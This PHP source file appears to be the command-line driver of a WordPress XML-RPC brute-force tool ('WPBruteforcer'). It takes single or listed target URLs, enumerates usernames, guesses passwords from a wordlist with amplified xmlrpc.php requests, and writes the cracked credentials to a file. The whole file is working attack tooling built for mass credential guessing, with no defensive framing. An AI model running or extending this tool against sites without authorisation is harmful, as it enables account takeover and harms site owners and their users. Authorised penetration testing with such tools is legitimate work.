<?php

namespace Arall\WPBruteforcer\Commands;

use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputArgument;
use Symfony\Component\Console\Input\InputOption;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Output\OutputInterface;
use Arall\WPBruteforcer\WPBruteforcer;
use DateTime;
use \Curl\Curl;

class Bruteforce extends Command
{
    /**
     * Input Interface.
     *
     * var InputInterface
     */
    private $input;

    /**
     * Output Interface.
     *
     * @var OutputInterface
     */
    private $output;

    /**
     * Target URL (single).
     *
     * @var string
     */
    private $url;

    /**
     * Target URL's (multi).
     *
     * @var array
     */
    private $urls;

    /**
     * Wordlist path.
     *
     * @var string
     */
    private $wordlist;

    /**
     * Username to bruteforce (single).
     *
     * @var string
     */
    private $username;

    /**
     * Usernames list path.
     *
     * @var string
     */
    private $usernames;

    /**
     * Usernames to bruteforce (loaded ones).
     *
     * @var array
     */
    private $users;

    /**
     * Do not enumerate usernames.
     *
     * @var bool
     */
    private $noenum = false;

    /**
     * Do not test XMLRPC.
     *
     * @var bool
     */
    private $notest = false;

    /**
     * Max tries per request.
     *
     * @var int
     */
    private $tries = 100;

    /**
     * Max usernames to enumerate.
     *
     * @var int
     */
    private $max_enum;

    /**
     * XMLRPC URI.
     *
     * @var string
     */
    private $uri = '/xmlrpc.php';

    /**
     * Output log path.
     *
     * @var string
     */
    private $output_path;

    /**
     * Output log data.
     *
     * @var string
     */
    private $output_data;

    /**
     * Bruteforcer instance.
     *
     * @var WPBruteforcer
     */
    private $bruteforcer;

    /**
     * Command configuration.
     */
    public function configure()
    {
        $this
            ->setName('bruteforce')
            ->setDescription('Bruteforce XMLRPC using amplification')
            ->addOption(
                'url',
                null,
                InputOption::VALUE_REQUIRED,
                'Website url (http://www.wordpress.org/)'
            )
            ->addOption(
               'urls',
               null,
               InputOption::VALUE_REQUIRED,
               'Websites list path (to bruteforce multiple targets)'
            )
            ->addOption(
               'wordlist',
               null,
               InputOption::VALUE_REQUIRED,
               'Wordlist path'
            )
            ->addOption(
               'tries',
               null,
               InputOption::VALUE_REQUIRED,
               'Nº of tries per request (100 as default)'
            )
            ->addOption(
               'username',
               null,
               InputOption::VALUE_REQUIRED,
               'Username to bruteforce (enumerate & bruteforce as default)'
            )
            ->addOption(
               'usernames',
               null,
               InputOption::VALUE_REQUIRED,
               'Usernames list path to bruteforce multiple usernames'
            )
            ->addOption(
               'no-enum',
               null,
               InputOption::VALUE_NONE,
               'Don\'t enumerate users (requires --username flag)'
            )
            ->addOption(
               'no-test',
               null,
               InputOption::VALUE_NONE,
               'Don\'t test XMLRPC'
            )
            ->addOption(
               'max-enum',
               null,
               InputOption::VALUE_REQUIRED,
               'Limit for username enumeration (unlimited as default)'
            )
            ->addOption(
               'uri',
               null,
               InputOption::VALUE_REQUIRED,
               'XMLRPC URI (/xmlrpc.php as default)'
            )
            ->addOption(
               'output',
               null,
               InputOption::VALUE_REQUIRED,
               'Save the obtained credentials to a txt file'
            )
        ;
    }

    /**
     * Command execution.
     *
     * @param InputInterface  $input
     * @param OutputInterface $output
     */
    public function execute(InputInterface $input, OutputInterface $output)
    {
        // Set Input / Output interfaces
        $this->input = $input;
        $this->output = $output;

        // Load arguments and options
        $this->loadInput();

        $this->bruteforcer = new WPBruteforcer();

        $time = new DateTime('now');

        if (!$this->loadWordlist()) {
            return false;
        }

        if (!$this->loadTargets()) {
            return false;
        }

        // Tries
        if ($this->tries) {
            $this->bruteforcer->setTries($this->tries);
        }

        // URI
        if ($this->uri) {
            $this->bruteforcer->setXmlrpcUri($this->uri);
        }

        foreach ($this->urls as $url) {
            $url = trim($url);

            $this->bruteforcer->setUrl($url);

            // Output current target
            $this->output->writeln(' [+] Target: <comment>' . $url . '</comment>');

            if (!$url = $this->checkUrl($url)) {
                continue;
            }

            if (!$this->checkXmlrpc()) {
                continue;
            }

            if (!$this->loadUsernames()) {
                continue;
            }

            // Bruteforce
            $this->bruteforce();
        }

        $this->saveOutput();

        $this->output->writeln(' [i] Elapsed time: ' . $time->diff(new DateTime('now'))->format('%H:%I:%S'));
    }

    /**
     * Load all the user input (arguments and options).
     */
    private function loadInput()
    {
        $this->url = $this->input->getOption('url');
        $this->urls = $this->input->getOption('urls');
        $this->wordlist = $this->input->getOption('wordlist');
        $this->tries = $this->input->getOption('tries');
        $this->username = $this->input->getOption('username');
        $this->usernames = $this->input->getOption('usernames');
        $this->noenum = $this->input->getOption('no-enum');
        $this->notest = $this->input->getOption('no-test');
        $this->max_enum = $this->input->getOption('max-enum');
        $this->uri = $this->input->getOption('uri');
        $this->output_path = $this->input->getOption('output');
        $this->output_data = '';
    }

    /**
     * Check if the provided URL is up and if it has a redirect.
     *
     * @param string $url
     *
     * @return string|bool Corrected / original url or false
     */
    private function checkUrl($url)
    {
        $curl = new Curl();
        $curl->setOpt(CURLOPT_SSL_VERIFYPEER, false);
        $curl->setOpt(CURLOPT_FOLLOWLOCATION, true);
        $curl->get($url);

        if ($curl->error && $curl->errorCode >= 400) {
            $this->output->writeln('<error> [!] Website HTTP error: ' . $curl->errorCode . '</error>');

            return false;
        }

        return $url;
    }

    /**
     * Load a wordlist.
     *
     * @return bool
     */
    private function loadWordlist()
    {
        // Wordlist
        if (!file_exists($this->wordlist)) {
            $this->output->writeln('<error> [!] Wordlist file not found. Exiting...</error>');

            return false;
        }
        $this->bruteforcer->setWordlist($this->wordlist);

        return true;
    }

    /**
     * Load the target (single) or the provided file list.
     *
     * @return bool
     */
    private function loadTargets()
    {
        // Targets
        if ($this->url) {
            $this->urls = [$this->url];
        } elseif ($this->urls) {
            // Check wordlist
            if (!file_exists($this->urls)) {
                $this->output->writeln('<error> [!] URLs file not found. Exiting...</error>');

                return false;
            }
            $this->urls = file($this->urls, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        }
        if (empty($this->urls)) {
            $this->output->writeln('<error> [!] No targets found. Exiting...</error>');

            return false;
        }

        return true;
    }

    /**
     * Check if the website has the XMLRPC up and running.
     *
     * @return bool
     */
    private function checkXmlrpc()
    {
        if (!$this->notest) {
            $this->output->writeln(' [+] Testing XMLRPC...');
            if (!$this->bruteforcer->testXMLRPC()) {
                $this->output->writeln('<error> [!] XMLRPC is not responding properly.</error>');

                return false;
            }
            $this->output->writeln(' [i] XMLRPC up and running!');
        }

        return true;
    }

    /**
     * Load the usernames using enumeration or / and the provided username.
     *
     * @return bool
     */
    private function loadUsernames()
    {
        $this->users = [];

        // Enumerate
        if (!$this->noenum) {
            $this->output->writeln(' [+] Enumerating users...');
            $users = $this->bruteforcer->enumerate($this->max_enum);
            if(!empty($users)){
                foreach($users as $user){
                    $this->users[] = $user['login'];
                }
            }
            $this->output->writeln(' [i] <comment>' . count($this->users) . '</comment> user(s) found');
        }

        // Single
        if ($this->username) {
            $this->users[] = $this->username;
        }

        // List
        if ($this->usernames) {
            // Check list
            if (!file_exists($this->usernames)) {
                $this->output->writeln('<error> [!] Usernames file not found. </error>');

                return false;
            }
            $this->users = array_merge($this->users, file($this->usernames, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
        }

        // Delete duplicated ones
        $this->users = array_unique($this->users);

        // Check
        if (empty($this->users)) {
            $this->output->writeln('<error> [!] No users to bruteforce.</error>');

            return false;
        }

        return true;
    }

    /**
     * Bruteforce the current loaded website's usernames.
     * Output the obtained credentials.
     * Saves the credentials into the output data.
     */
    private function bruteforce()
    {
        foreach ($this->users as $user) {
            $this->bruteforcer->setUsername($user);
            $this->output->writeln(' [+] Bruteforcing user <comment>' . $user . '</comment>');
            if ($password = $this->bruteforcer->bruteforce()) {
                $this->output->writeln('<info> [!] Password found!</info> <comment>' . $password . '</comment>');
                // Save data for a possible output
                $this->output_data .= $this->url . ' | ' . $user . ' | ' . $password . PHP_EOL;
            }
        }
        $this->output->writeln('');
    }

    /**
     * Save the output data into a file.
     *
     * @return bool
     */
    private function saveOutput()
    {
        if ($this->output_path) {
            file_put_contents($this->output_path, $this->output_data);
            $this->output->writeln(' [+] Credentials saved in <comment>' . $this->output_path . '</comment>');
            $this->output->writeln('');

            return true;
        }

        return false;
    }
}
